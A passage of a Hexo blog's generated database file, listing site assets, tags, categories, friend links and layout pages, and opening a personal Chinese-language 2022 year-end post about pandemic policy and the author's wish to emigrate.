673048","modified":1671590959602},{"_id":"public/categories/笔记/page/3/index.html","hash":"26f0c726b75d891f52325e78f52bcecf8813e8ed","modified":1671590959602},{"_id":"public/tags/rust/index.html","hash":"d5f116bffafe1671c2c0f147667bc9451baa7329","modified":1671590959602},{"_id":"public/tags/docker/index.html","hash":"7bd09644daff703da42f5664929ff3e121fdfd35","modified":1671590959602},{"_id":"public/tags/framework层/index.html","hash":"6d93655d2c1a2aaa10a0d83bad9e09d90d4cec4b","modified":1671590959602},{"_id":"public/tags/Java/index.html","hash":"91d1416f4c995db10e5efdb29c2beceb8932b354","modified":1671590959602},{"_id":"public/tags/Kotlin/index.html","hash":"2cbe01f97b2beae967412e2d172f261eeaac8d37","modified":1671590959602},{"_id":"public/tags/Kotlin/page/2/index.html","hash":"dd91788a23b2cb9b43d54e26247c7535316fa4df","modified":1671590959602},{"_id":"public/tags/git/index.html","hash":"0d8006e7a9b1ebd782676bba79c45492183dc00b","modified":1671590959602},{"_id":"public/tags/maven/index.html","hash":"e2981dd7c7fc780979c3f9ba72ae792bb0b77799","modified":1671590959602},{"_id":"public/tags/MVVM/index.html","hash":"315c66c3fcff115612e55d651b85afa494523269","modified":1671590959602},{"_id":"public/tags/外部库/index.html","hash":"230cbacb67cc75637b685e0787097c0eb7051a52","modified":1671590959602},{"_id":"public/tags/ASM/index.html","hash":"51d69a039ab8833c698125325cec10cb8a2ffc4b","modified":1671590959602},{"_id":"public/tags/Minecraft/index.html","hash":"473657770ed185914df4c4f754e852c691b17d40","modified":1671590959602},{"_id":"public/2021/11/29/async-javascript/index.html","hash":"3d7ddfdd66f15890b8d48b3b7c864a0fa6fdd6a9","modified":1671590959602},{"_id":"public/tags/Forge模组开发/index.html","hash":"023d31dbc896039a5815d96abe73bca4a453464a","modified":1671590959602},{"_id":"public/tags/Mixin/index.html","hash":"d6b44a5d9cd6ef97190ab1aac4a0915bf1df7502","modified":1671590959602},{"_id":"public/tags/字节码操作/index.html","hash":"398e3899dcba7a6902973a2c56c0a0ddb7e72d2a","modified":1671590959602},{"_id":"public/tags/SpringBoot/index.html","hash":"6d049d77aa432053be667a74be68d642d46a9703","modified":1671590959602},{"_id":"public/tags/后端/index.html","hash":"45b27a20572ff8b12d4fb18aeaebf30f579e1864","modified":1671590959602},{"_id":"public/tags/Idea/index.html","hash":"1b36b9b6f6f95d180ed74f5fe5cbbb5d6b7a84ed","modified":1671590959602},{"_id":"public/tags/Compose/index.html","hash":"a994df54e0c185042522ae3a900e3c0788026492","modified":1671590959602},{"_id":"public/tags/委托/index.html","hash":"f4a10e2099a49446d1f5cdccb337cca6e63adb85","modified":1671590959602},{"_id":"public/tags/Coroutine/index.html","hash":"d2d5ed55574e2ec31e082aeedfefeabdbabd1c54","modified":1671590959602},{"_id":"public/tags/Bukkit/index.html","hash":"14df08c3b9ef0ebee7174594275dedac409f2830","modified":1671590959602},{"_id":"public/tags/TabooLib/index.html","hash":"68357c591a69df2309d1a98f2fb0b9d7fdb81dc1","modified":1671590959602},{"_id":"public/tags/网络操作/index.html","hash":"d56e8d370a6550abe358047f0f94f42c5bb05c02","modified":1671590959602},{"_id":"public/tags/Rust学习笔记/index.html","hash":"15eef75042fd4037506471a1ccf348bad638014d","modified":1671590959602},{"_id":"public/tags/动态代理/index.html","hash":"4de1491894070ebea99f39454b7476f69a50ebc6","modified":1671590959602},{"_id":"public/tags/JVM/index.html","hash":"ef36a4af98ca7d4f1a4a731bfbcf4320ebe1694d","modified":1671590959602},{"_id":"public/tags/字节码/index.html","hash":"6536662774c0b56c795a0be993ddde99db345edf","modified":1671590959602},{"_id":"public/tags/linux/index.html","hash":"209349e7f8bd54f384566330668c38bd4668790c","modified":1671590959602},{"_id":"public/tags/arch-linux/index.html","hash":"5135e45be5e77b02d4aa8bd31877c962b2ee38fa","modified":1671590959602},{"_id":"public/tags/Rust/index.html","hash":"782aa18ba4db78511c937f816f014fe091623a92","modified":1671590959602},{"_id":"public/CNAME","hash":"3e886ae43e8ca3ebc0096c15abd1e97ea989dba4","modified":1671590959602},{"_id":"public/medias/comment_bg.png","hash":"dfc93d24081884fbc58cab0f8fd19e77d31d6123","modified":1671590959602},{"_id":"public/medias/icp.png","hash":"27a96f31f7d0413c6ade6f40e06f021f501151c7","modified":1671590959602},{"_id":"public/libs/twikoo/twikoo.all.min.js.LICENSE.txt","hash":"6e1c8f7b23f06ca4c727c805fda053dc1d9193d0","modified":1671590959602},{"_id":"public/medias/barrager/1.png","hash":"b8c211690dba3addedfe7b928e3936cd487df0d6","modified":1671590959602},{"_id":"public/medias/barrager/0.png","hash":"b30416fd3b3aec5af3fa90823a7e2e9c0af4cda8","modified":1671590959602},{"_id":"public/medias/barrager/2.png","hash":"52b2b13373fe611ad2327b9b40426d6dc05b69cd","modified":1671590959602},{"_id":"public/medias/barrager/close.png","hash":"045346df61ee01abe5018c5d9ba805d2831ce7b1","modified":1671590959602},{"_id":"public/medias/featureimages/10.jpg","hash":"98e7f6fd9c97d4de9044b6871ca08ebf14db11b9","modified":1671590959602},{"_id":"public/medias/featureimages/13.jpg","hash":"35a320174f8e316e3eadaec658024276b651c6e9","modified":1671590959602},{"_id":"public/medias/featureimages/16.jpg","hash":"97a829c4bc94f9d2929b20a1a9b798c57b9f7205","modified":1671590959602},{"_id":"public/medias/featureimages/15.jpg","hash":"da0fbee3b7bde1607eace377ddf834c0be99edfe","modified":1671590959602},{"_id":"public/medias/featureimages/2.jpg","hash":"4bba691cf71a517ecaeaf42afd3e8f8b31e346c1","modified":1671590959602},{"_id":"public/medias/featureimages/21.jpg","hash":"b26edb128bb0bf58b23fd2f014e9555e89a2ca3b","modified":1671590959602},{"_id":"public/medias/featureimages/22.jpg","hash":"754579747a3e99747d890fca3162f370b96a7941","modified":1671590959602},{"_id":"public/medias/featureimages/23.jpg","hash":"7d7f37da3fa7128343adac23866449eb2c6a549a","modified":1671590959602},{"_id":"public/medias/featureimages/3.jpg","hash":"6ec646c2a70f5f11edacf225c1477f2200a37a96","modified":1671590959602},{"_id":"public/medias/featureimages/5.jpg","hash":"41ca20129a37fedc573eec28dd7d7b9e5b09228a","modified":1671590959602},{"_id":"public/medias/featureimages/7.jpg","hash":"7975141cd64e875122c0ea33daaca1a06bf00b8e","modified":1671590959602},{"_id":"public/medias/featureimages/8.jpg","hash":"8e4b7186352085483ca1174c7c0800114c48df8b","modified":1671590959602},{"_id":"public/medias/reward/alipay.jpg","hash":"1abc719b95d1b26f1f898e6b0a9b7609146e332f","modified":1671590959602},{"_id":"public/medias/reward/wechat.png","hash":"fe93385aa92fe328e01c8221a80b039be9e4e140","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.eot","hash":"670fb01e4930ae46fe8d6d2b75ead288f54e8e61","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.ttf","hash":"c34acd6818df6db6be41a2e331886765d601f2eb","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff","hash":"3ad4f4e4b1fb3edee3d4ba25e6cdfed2f0b88a54","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.woff2","hash":"13517529affa39e2585c591acae6dc336b6aa917","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.eot","hash":"54caf05a81e33d7bf04f2e420736ce6f1de5f936","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.svg","hash":"67d261ac428761389c895e1da73664e633e14a72","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.ttf","hash":"f6421c0c397311ae09f9257aa58bcd5e9720f493","modified":1671590959602},{"_id":"public/libs/lightGallery/fonts/lg.woff","hash":"3048de344dd5cad4624e0127e58eaae4b576f574","modified":1671590959602},{"_id":"public/libs/lightGallery/img/loading.gif","hash":"15a76af2739482d8de7354abc6d8dc4fca8d145e","modified":1671590959602},{"_id":"public/libs/lightGallery/img/video-play.png","hash":"2962e03ddbe04d7e201a5acccac531a2bbccddfc","modified":1671590959602},{"_id":"public/libs/lightGallery/img/vimeo-play.png","hash":"9b72fc0f86a01467ed0b68c9cc4d604ec316d517","modified":1671590959602},{"_id":"public/libs/lightGallery/img/youtube-play.png","hash":"f8d11384d33b7a79ee2ba8d522844f14d5067a80","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.eot","hash":"00ff749c8e202401190cc98d56087cdda716abe4","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.svg","hash":"1d56c9d5db0273f07c43cc1397e440f98ba7827a","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.ttf","hash":"afd898f59d363887418669520b24d175f966a083","modified":1671590959602},{"_id":"public/libs/share/fonts/iconfont.woff","hash":"2e3fce1dcfbd6e2114e7bfbeaf72d3c62e15a1bd","modified":1671590959602},{"_id":"public/favicon.png","hash":"9b84ac547aa25f45071ac7757384a63c51df7a4c","modified":1671590959602},{"_id":"public/medias/logo.png","hash":"9b84ac547aa25f45071ac7757384a63c51df7a4c","modified":1671590959602},{"_id":"public/medias/featureimages/0.jpg","hash":"1c3300f029fc85d6dda6fa4f1d699551034cdaf7","modified":1671590959602},{"_id":"public/medias/featureimages/1.jpg","hash":"684ae89de8cb7acefae19f5aee6c612037c46393","modified":1671590959602},{"_id":"public/medias/featureimages/14.jpg","hash":"38e11221406785bcd93aa9cd23e568e164630ef1","modified":1671590959602},{"_id":"public/medias/featureimages/12.jpg","hash":"8a4b2e7d92ae95c3b0c921db23c35aa9a41a7d58","modified":1671590959602},{"_id":"public/medias/featureimages/11.jpg","hash":"f55972ce7175684f2b11c3c9fc2b5b14bccbfae8","modified":1671590959602},{"_id":"public/medias/featureimages/17.jpg","hash":"42d47903551ee81885c1386022982cae165841c5","modified":1671590959602},{"_id":"public/medias/featureimages/18.jpg","hash":"64829272ec85bb819d55ff89e5b5fd6f64aa436b","modified":1671590959602},{"_id":"public/medias/featureimages/19.jpg","hash":"eb250906fdbc0c408f42ae9933725bc1a05d79fb","modified":1671590959602},{"_id":"public/medias/featureimages/20.jpg","hash":"3b11f9b461168d907073f793190865fe621a8573","modified":1671590959602},{"_id":"public/medias/featureimages/4.jpg","hash":"e06c47de27619984be9d5d02947f8370a432dfea","modified":1671590959602},{"_id":"public/medias/featureimages/6.jpg","hash":"c8f2aa4bbb041158b4e73733a341e6a77c8583f7","modified":1671590959602},{"_id":"public/medias/featureimages/9.jpg","hash":"b956a2291a04b2132366b53666cf34858b8bdb1f","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff","hash":"1e1f02bfa89e179fe2dd1383273b8812aa873418","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.woff2","hash":"0613c7ebba55ee47ef302c0f7766324692f899a7","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff","hash":"a22acd7697f36e7d4cc31a853c70e776eac54bb1","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.woff2","hash":"0ccb2c814a7e4ca12c4778821633809cb0361eaa","modified":1671590959602},{"_id":"public/css/barrager.css","hash":"862879d9313ed8d4c721fa32ef8f94ac2f0a28ae","modified":1671590959602},{"_id":"public/css/gallery.css","hash":"79dfdf68d675c17782271647283c568d086e4b98","modified":1671590959602},{"_id":"public/css/my-gitalk.css","hash":"af18dd29e58642c18bab9b89541767b494c468dd","modified":1671590959602},{"_id":"public/css/my.css","hash":"497e50351f7838f8546cac76850a42e7e380a110","modified":1671590959602},{"_id":"public/css/bb.css","hash":"aa15633888c7cf9baea8bb48d796c68b57cf14bf","modified":1671590959602},{"_id":"public/css/gitment.css","hash":"2bd15cc17dca35ac3ecc0acf167a23a1dd362acd","modified":1671590959602},{"_id":"public/js/jquery.barrager.js","hash":"19c8b2498ca1083e537f7f443172970912107f83","modified":1671590959602},{"_id":"public/js/gallery-encrypt.js","hash":"18dcfa4a8da8847b64be75f287f45c0e830bbcab","modified":1671590959602},{"_id":"public/js/search.js","hash":"5caa2d6e3d34c334ac68dfaafc81a583d6123382","modified":1671590959602},{"_id":"public/js/matery.js","hash":"b86de5fe3e9766b7ff80df12ea41c3a9e30825f7","modified":1671590959602},{"_id":"public/libs/aos/aos.js","hash":"02bfb40b0c4b6e9b0b4081218357145cbb327d74","modified":1671590959602},{"_id":"public/libs/aplayer/APlayer.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1671590959602},{"_id":"public/libs/background/ribbon-dynamic.js","hash":"052b80c29e6bc585aa28d4504b743bdbac220a88","modified":1671590959602},{"_id":"public/libs/background/canvas-nest.js","hash":"65333d0dbb9c1173a1b13031b230161fc42c8b2f","modified":1671590959602},{"_id":"public/libs/background/ribbon-refresh.min.js","hash":"6d98692b2cad8c746a562db18b170b35c24402f4","modified":1671590959602},{"_id":"public/libs/background/ribbon.min.js","hash":"6a99d494c030388f96f6086a7aaa0f03f3fe532e","modified":1671590959602},{"_id":"public/libs/codeBlock/codeBlockFuction.js","hash":"c7ab06d27a525b15b1eb69027135269e9b9132fb","modified":1671590959602},{"_id":"public/libs/codeBlock/codeCopy.js","hash":"6d39a766af62e625f177c4d5cf3adc35eed71e61","modified":1671590959602},{"_id":"public/libs/codeBlock/codeLang.js","hash":"bac88b4d4e3679732d29bd037c34f089cf27cf05","modified":1671590959602},{"_id":"public/libs/codeBlock/codeShrink.js","hash":"201e8cd761b4be557247bdaf1ebc7c11c83194f6","modified":1671590959602},{"_id":"public/libs/instantpage/instantpage.js","hash":"83ce8919b1a69b2f1809ffaf99b52a8627e650e9","modified":1671590959602},{"_id":"public/libs/jqcloud/jqcloud-1.0.4.min.js","hash":"257eaae3020599e4939f50d5008a743827f25b8c","modified":1671590959602},{"_id":"public/libs/jqcloud/jqcloud.css","hash":"20d9f11a19d95c70e27cb922e0d6dccbec4eae89","modified":1671590959602},{"_id":"public/libs/minivaline/MiniValine.js","hash":"f7f6cdc1b22297e02334e304444e9a8351acb455","modified":1671590959602},{"_id":"public/libs/others/busuanzi.pure.mini.js","hash":"6e41f31100ae7eb3a6f23f2c168f6dd56e7f7a9a","modified":1671590959602},{"_id":"public/libs/others/clicklove.js","hash":"6a39b8c683ba5dcd92f70c6ab45d1cfac3213e8e","modified":1671590959602},{"_id":"public/libs/others/snow.js","hash":"02b1eeaca737c47be637b304feb3d36d792ee0c4","modified":1671590959602},{"_id":"public/libs/others/star.js","hash":"cf32f8ce2a1a51ba65d3b6063fe2ee1482550190","modified":1671590959602},{"_id":"public/libs/prism/prism.css","hash":"f1a273e896538fa4e11cb70acc5ec7e88d8b6c4c","modified":1671590959602},{"_id":"public/libs/scrollprogress/scrollProgress.min.js","hash":"777ffe5d07e85a14fbe97d846f45ffc0087251cc","modified":1671590959602},{"_id":"public/libs/tocbot/tocbot.css","hash":"9ab8ef576c9a57115194152e79cca79b0a41dd70","modified":1671590959602},{"_id":"public/libs/tocbot/tocbot.min.js","hash":"5ec27317f0270b8cf6b884c6f12025700b9a565c","modified":1671590959602},{"_id":"public/libs/share/css/share.min.css","hash":"8a778a86f3ce9a042df6be63a9f1039631e351a5","modified":1671590959602},{"_id":"public/css/matery.css","hash":"1ea56cd7562b2604cf7555730a0524f83d867615","modified":1671590959602},{"_id":"public/js/crypto-js.js","hash":"3dd73b6f13dc818a3a9c5c7424c1c4a9649b00a2","modified":1671590959602},{"_id":"public/libs/aos/aos.css","hash":"191a3705a8f63e589a50a0ff2f2c5559f1a1b6b2","modified":1671590959602},{"_id":"public/libs/animate/animate.min.css","hash":"97afa151569f046b2e01f27c1871646e9cd87caf","modified":1671590959602},{"_id":"public/libs/aplayer/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1671590959602},{"_id":"public/libs/cryptojs/crypto-js.min.js","hash":"5989527a378b55011a59522f41eeb3981518325c","modified":1671590959602},{"_id":"public/libs/dplayer/DPlayer.min.css","hash":"f7d19655f873b813ffba5d1a17145c91f82631b8","modified":1671590959602},{"_id":"public/libs/gitalk/gitalk.css","hash":"61d71cb30f5f34cbb1f2b5bc469784d6cb908c22","modified":1671590959602},{"_id":"public/libs/dplayer/DPlayer.min.js","hash":"490148a22ab2b03a880495cc733ecd1840c02ed6","modified":1671590959602},{"_id":"public/libs/gitment/gitment-default.css","hash":"2903c59ee06b965bef32e937bd69f5b0b2190717","modified":1671590959602},{"_id":"public/libs/gitment/gitment.js","hash":"28c02c45ce568e084cd1041dc493f83f9c6c88c6","modified":1671590959602},{"_id":"public/libs/jquery/jquery.min.js","hash":"2115753ca5fb7032aec498db7bb5dca624dbe6be","modified":1671590959602},{"_id":"public/libs/masonry/masonry.pkgd.min.js","hash":"d20252cf76c3be8af37a8415d13ad368c762b4d8","modified":1671590959602},{"_id":"public/libs/materialize/materialize.min.css","hash":"a69d456e3345e7f59cd0d47d1b3e70fd4a496a05","modified":1671590959602},{"_id":"public/libs/others/sakura-half.js","hash":"a41b64af88fdd0e2d3502752d059661c1bc743dc","modified":1671590959602},{"_id":"public/libs/materialize/materialize.min.js","hash":"c8b4c65651921d888cf5f27430dfe2ad190d35bf","modified":1671590959602},{"_id":"public/libs/others/sakura-reduce.js","hash":"f7527e9fb4e6fe2cc7c8880692d77bcda95900c7","modified":1671590959602},{"_id":"public/libs/others/sakura-small.js","hash":"3284a9ab71454e574d80663f3a05735cd12a6a05","modified":1671590959602},{"_id":"public/libs/others/sakura.js","hash":"9e196ab241799126e6a2dd23ee1708b1505ccbf0","modified":1671590959602},{"_id":"public/libs/valine/av-min.js","hash":"541efb9edc1ce425cbe3897cfc25803211fe6a05","modified":1671590959602},{"_id":"public/libs/valine/Valine.min.js","hash":"6cbdbf91e1f046dd41267a5ff0691a1fccba99df","modified":1671590959602},{"_id":"public/libs/awesome/css/all.css","hash":"8a4a55db46c5dbfef9c6703fa2d04e89cbfcf633","modified":1671590959602},{"_id":"public/libs/lightGallery/css/lightgallery.min.css","hash":"1b7227237f9785c66062a4811508916518e4132c","modified":1671590959602},{"_id":"public/libs/awesome/css/all.min.css","hash":"a57ee68d11601b0fd8e5037fc241ff65a754473c","modified":1671590959602},{"_id":"public/libs/lightGallery/js/lightgallery-all.min.js","hash":"9f5ef4bc8a0a3c746ca4f3c3e6d64493b1a977d8","modified":1671590959602},{"_id":"public/libs/share/js/jquery.share.min.js","hash":"41367dcb857e02e3c417ebe68a554ce1d4430806","modified":1671590959602},{"_id":"public/libs/share/js/social-share.min.js","hash":"a3090a02786dcd4efc6355c1c1dc978add8d6827","modified":1671590959602},{"_id":"public/libs/twikoo/twikoo.all.min.js","hash":"c3f5f0a69b7864e7ef5bbf99fc774bec37947d7c","modified":1671590959602},{"_id":"public/medias/avatar.jpg","hash":"7f3944f24beb7f74c0002f9bd66bb69160092ebd","modified":1671590959602},{"_id":"public/medias/cover.jpg","hash":"d4957ff7cc5e88555cd840f2956ab0561e6f1ccf","modified":1671590959602},{"_id":"public/medias/images/02.jpg","hash":"a5b656606811f4d7e10307f48c0e3c373e0b886d","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.eot","hash":"d1ffd6340cdbf72890ccb67f32015eafc5df51a7","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.ttf","hash":"8ab907083fecaaa2a9ec93b27f884ad74573705c","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-regular-400.svg","hash":"229deca2465fa9efc8c03d0ebeb9a01c1559822e","modified":1671590959602},{"_id":"public/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1671590959602},{"_id":"public/libs/gitalk/gitalk.min.js","hash":"564fc7c731d05fa70d71ef853a2c8cc7725739e2","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.eot","hash":"ea845c59bee4a5c6db774b8d8060f5641b789ae9","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.ttf","hash":"eb8914f6b1797b45ee0883e6089d92695d9f9441","modified":1671590959602},{"_id":"public/medias/images/03.jpg","hash":"2bd3815508a9f5b0ae79aa780bc02ac80b2a354e","modified":1671590959602},{"_id":"public/medias/banner/3.jpg","hash":"e90bf089aefe9335533e3100b8884efbf5afe4f1","modified":1671590959602},{"_id":"public/medias/banner/0.jpg","hash":"533c654621b62b59e5e2bb34e1d395d2df1ac9d0","modified":1671590959602},{"_id":"public/medias/banner/1.jpg","hash":"120e44d82a71a53753d341b40d296d88a988b6a4","modified":1671590959602},{"_id":"public/medias/images/01.jpg","hash":"6a81f437fb876666bafaa98b2a09bd8bd7f21832","modified":1671590959602},{"_id":"public/medias/banner/4.jpg","hash":"3550f27acfacd334a55ee3a8ef4d55a364071347","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-brands-400.svg","hash":"b7fd3035e83c23c720c9f5957af31d7e288fb4eb","modified":1671590959602},{"_id":"public/medias/banner/5.jpg","hash":"ed1bdfb61dae0cc949fc0bb15a057b7aa957ec92","modified":1671590959602},{"_id":"public/libs/awesome/webfonts/fa-solid-900.svg","hash":"023bb481b65dd8cdeb8c424ca900f3866292bfb0","modified":1671590959602},{"_id":"public/medias/banner/2.jpg","hash":"8148fbb013e119e345c01bfcd3b95a8bbfb28339","modified":1671590959602},{"_id":"public/medias/banner/6.jpg","hash":"cd8f514ad8db1b74d541f83b987b2f17f8e1211c","modified":1671590959602}],"Category":[{"name":"杂谈","_id":"clbx23jsy0004sfklh6q8cvzl"},{"name":"笔记","_id":"clbx23jt5000csfkl1nu38gkl"},{"name":"教程","_id":"clbx23jty002psfkl4w9y0uxc"}],"Data":[{"_id":"friends","data":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}],"Page":[{"title":"404","date":"2018-09-30T09:25:30.000Z","type":"404","layout":"404","description":"Oops～，我崩溃了！找不到你想要的页面 :(","_content":"","source":"404/index.md","raw":"---\ntitle: 404\ndate: 2018-09-30 17:25:30\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops～，我崩溃了！找不到你想要的页面 :(\"\n---","updated":"2021-11-08T17:44:03.000Z","path":"404/index.html","comments":1,"_id":"clbx23jso0000sfklfi18102e","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","type":"categories","layout":"categories","_content":"\n","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2018-09-30 17:25:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n\n","updated":"2021-11-08T17:38:50.000Z","path":"categories/index.html","comments":1,"_id":"clbx23jsv0002sfkldlycaewn","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","type":"about","layout":"about","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2018-09-30 17:25:30\ntype: \"about\"\nlayout: \"about\"\n---","updated":"2021-11-08T17:40:19.000Z","path":"about/index.html","comments":1,"_id":"clbx23jt00006sfklaeee6ti8","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","type":"contact","layout":"contact","_content":"","source":"contact/index.md","raw":"---\ntitle: contact\ndate: 2018-09-30 17:25:30\ntype: \"contact\"\nlayout: \"contact\"\n---","updated":"2021-11-08T17:41:42.000Z","path":"contact/index.html","comments":1,"_id":"clbx23jt20008sfklej5yah6y","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""},{"title":"tags","date":"2018-09-30T10:23:38.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2018-09-30 18:23:38\ntype: \"tags\"\nlayout: \"tags\"\n---\n","updated":"2021-11-08T17:39:24.000Z","path":"tags/index.html","comments":1,"_id":"clbx23jt3000asfklbu9z0toc","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""},{"title":"friends","date":"2018-12-12T13:25:30.000Z","type":"friends","layout":"friends","_content":"","source":"friends/index.md","raw":"---\ntitle: friends\ndate: 2018-12-12 21:25:30\ntype: \"friends\"\nlayout: \"friends\"\n---\n","updated":"2021-11-08T17:42:15.000Z","path":"friends/index.html","comments":1,"_id":"clbx23jt5000fsfklfpke70rf","content":"","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":""}],"Post":[{"title":"2022年度总结","date":"2022-12-20T16:00:00.000Z","author":"寒雨","hide":false,"_content":"\n# 2022年度总结\n\n> 持续了三年的疫情防控政策最后竟以这样一种闹剧般的方式结束了。大家让渡了三年的自由光阴，最后换来了一场空，结果大家还是难逃感染新冠的诡运。这三年，我看见了太多，思想也变了太多。\n>\n> 最后还是难逃感染的诡运，摆烂的大环境下我无法独善其身。“能染则染，应染尽染”\n>\n> 如此荒谬的政策竟然还有这么多人为之洗地，他们甚至拿不出自己的论据，说不过了就又搬出美国 ”你以为美国就能好到哪里去？“ ”美国死的人比我们多得多“ 真的是成为了完全不会独立思考的猪猡，我能容纳不同的观点不同的论调，但我不能容纳无理取闹。又想到了以后进入社会要为房子车子孩子给自己带上镣铐，成为一个血肉铸成的劳动机器，我就感觉未来黯淡无光，留在这个国家没有未来，只有精神和肉体的双重奴役。\n>\n> 我累了，已经不觉得自己能改变这片土地上的苦痛哪怕一分一毫了，但我还有机会改变自己的命运。小时候父母问我未来想不想出国，我当时说我觉得中国挺好的。现在想来真是笑话，那时候我明明什么都不懂，什么负担都没有，仅仅因为热爱我土生土长的这片土地便说出了这样的话。是啊，我热爱我土生土长的这片土地，也爱着我在这片土地上邂逅的人，但即便热爱，即便难以割舍，我依然做出了决断。为什么中国每年润出去这么多人，他们难道真的一点故土情节都没有吗？我想应该多少都是有的。是什么样的苦难使他们克服了故土情节，以前我不懂。\n\n","source":"_posts/2022.md","raw":"---\ntitle: 2022年度总结\ndate: 2022-12-21\nauthor: 寒雨\nhide: false\ncategories: 杂谈\ntags:\n  - 年度总结\n---\n\n# 2022年度总结\n\n> 持续了三年的疫情防控政策最后竟以这样一种闹剧般的方式结束了。大家让渡了三年的自由光阴，最后换来了一场空，结果大家还是难逃感染新冠的诡运。这三年，我看见了太多，思想也变了太多。\n>\n> 最后还是难逃感染的诡运，摆烂的大环境下我无法独善其身。“能染则染，应染尽染”\n>\n> 如此荒谬的政策竟然还有这么多人为之洗地，他们甚至拿不出自己的论据，说不过了就又搬出美国 ”你以为美国就能好到哪里去？“ ”美国死的人比我们多得多“ 真的是成为了完全不会独立思考的猪猡，我能容纳不同的观点不同的论调，但我不能容纳无理取闹。又想到了以后进入社会要为房子车子孩子给自己带上镣铐，成为一个血肉铸成的劳动机器，我就感觉未来黯淡无光，留在这个国家没有未来，只有精神和肉体的双重奴役。\n>\n> 我累了，已经不觉得自己能改变这片土地上的苦痛哪怕一分一毫了，但我还有机会改变自己的命运。小时候父母问我未来想不想出国，我当时说我觉得中国挺好的。现在想来真是笑话，那时候我明明什么都不懂，什么负担都没有，仅仅因为热爱我土生土长的这片土地便说出了这样的话。是啊，我热爱我土生土长的这片土地，也爱着我在这片土地上邂逅的人，但即便热爱，即便难以割舍，我依然做出了决断。为什么中国每年润出去这么多人，他们难道真的一点故土情节都没有吗？我想应该多少都是有的。是什么样的苦难使他们克服了故土情节，以前我不懂。\n\n","slug":"2022","published":1,"updated":"2022-12-21T02:33:19.593Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jsr0001sfklfi3vci2u","content":"<h1 id=\"2022年度总结\"><a href=\"#2022年度总结\" class=\"headerlink\" 